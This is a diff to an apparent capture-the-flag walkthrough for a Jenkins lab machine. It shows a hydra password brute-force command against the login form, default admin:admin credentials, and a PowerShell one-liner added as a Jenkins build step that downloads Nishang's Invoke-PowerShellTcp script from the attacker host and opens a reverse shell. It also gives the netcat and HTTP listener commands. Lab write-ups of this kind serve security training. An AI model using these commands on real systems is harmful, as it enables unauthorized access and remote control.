@@ -36,3 +36,22 @@ Disallow: /
         - Format is j_username=^USER^&j_password=^PASS^
     - `hydra -l admin -P /usr/share/wordlists/rockyou.txt <target ip> http-post-form "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^:Invalid" -s 8080`
 
+> The username and password combination that is returned is **admin:admin**
+
+### What is the user.txt flag?
+
+- Find a way to execute code from inside the portal
+    - Jenkins is a server that allows developers to build, test, and deploy their codebase
+    - There is currently an existing project in the Jenkins portal named "project"
+    - The project allows you to add Windows batch commands as part of the build instructions
+- Set up a reverse shell to the machine
+    - powershell iex (New-Object Net.WebClient).DownloadString('http://<attack machine ip>:<attack machine port 1>/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress <attack machine ip> -Port <attack machine port 2>
+    - Click *apply* and *save* after adding reverse shell command in Jenkins build instructions
+    - Before building (and running the reverse shell) on the Jenkins server, set up listeners on attack machine - **Important note**: In the above, attack machine port 1 should be replaced by the port of the *HTTP Web Server* and attack machine port 2 should be replaced by the port of the *Netcat listener*
+        - HTTP Server to host initial reverse shell script
+            - Use this [script](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1) (options are already configured in the one-liner)
+            - Navigate to the folder the script is downloaded to on the attack machine
+            - `python3 -m http.server <port>` to serve everything in that folder (`python -m SimpleHTTPServer <attack machine port 1> for older Python versions)
+        - Netcat Listener to receive reverse shell connection
+            - `nc -lvnp <attack machine port 2>` to listen on the port set in the powershell one-liner (may need to use `ncat -lvnp <attack machine port 2>` for newer distros)
+
